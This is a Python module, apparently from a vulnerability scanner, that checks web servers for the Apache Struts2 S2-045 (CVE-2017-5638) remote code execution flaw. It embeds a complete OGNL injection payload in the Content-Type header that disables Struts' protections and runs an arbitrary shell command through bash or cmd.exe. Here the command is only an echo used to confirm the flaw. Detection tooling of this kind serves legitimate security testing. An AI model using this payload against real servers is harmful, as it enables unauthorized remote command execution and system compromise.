#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_capta, parser_url
from app.lib.utils.encode import urlencode, base64encode

class S2_045_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-045漏洞,又名CVE-2017-5638漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10',
            'date': '2017-03-02',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        self.headers = dict()
        self.headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        self.payload = r'''%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd_data').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''

    def run(self):

        """
        检测是否存在漏洞

        :param:
        :return str True or False
        """

        try:
            self.check_payload = self.payload.replace('cmd_data', 'echo ' + self.capta)
            self.headers['Content-Type'] = self.check_payload
            check_req = request.get(self.url, headers = self.headers)
            if self.capta in check_req.text and len(check_req.text) < 100:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_045 = S2_045_BaseVerify('http://localhost:8080/s2_045_war_exploded/Upload.action')
    